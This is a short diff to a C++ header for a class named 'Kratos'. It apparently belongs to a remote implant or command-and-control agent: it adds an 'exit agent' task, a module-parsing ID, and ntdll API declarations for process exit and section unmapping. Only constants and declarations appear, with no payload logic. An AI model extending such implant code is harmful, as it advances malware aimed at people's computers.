@@ -38,13 +38,16 @@
 #define TASK_LIST_MODULES  0xb2
 #define TASK_RUN_CMD       0xb3
 #define TASK_UNLOAD_MODULE 0xb4
-
+#define TASK_EXIT_AGENT    0xb5
 
 // Output IDs
 #define OUTPUT_NO_PARSE    0xc1
 #define OUTPUT_NEEDS_PARSE 0xc2
 #define OUTPUT_SUCCESS     0xc3
 #define OUTPUT_ERROR       0xc4
+
+// Parser IDs carried by OUTPUT_NEEDS_PARSE
+#define PARSE_MODULE_BITS 101
 
 // Error Ids
 #define ERROR_MODULE_LOADED         10
@@ -66,10 +69,12 @@
 
 class Kratos {
 private:
-	void moduleLoad();
-	void moduleUnload();
-	void moduleList();
-	void runModuleCmd();
+	void moduleLoad( );
+	void moduleUnload( );
+	void moduleList( );
+	void runModuleCmd( );
+	void exitAgent( );
+	void Cleanup( );
 
 public:
 	struct Apis {
@@ -93,11 +98,14 @@ public:
 
 		// ntdll
 		DECL(RtlRandomEx);
+		DECL(RtlExitUserProcess);
+		DECL(RtlExitUserThread);
 		DECL(NtOpenProcessToken);
 		DECL(NtQueryInformationToken);
 		DECL(NtQueryInformationProcess);
 		DECL(NtCreateSection);
 		DECL(NtMapViewOfSection);
+		DECL(NtUnmapViewOfSection);
 		DECL(NtProtectVirtualMemory);
 		DECL(NtFlushInstructionCache);
 	};
